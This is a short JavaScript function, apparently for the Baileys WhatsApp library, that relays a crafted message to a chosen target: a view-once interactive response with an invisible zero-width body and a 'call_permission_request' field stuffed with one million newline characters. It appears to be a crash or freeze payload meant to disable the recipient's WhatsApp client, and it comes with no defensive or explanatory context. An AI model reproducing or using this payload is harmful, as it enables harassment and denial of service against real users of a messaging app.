async function invCall(sock, target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\u200B",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\n".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    { participant: { jid: target } }
  );
}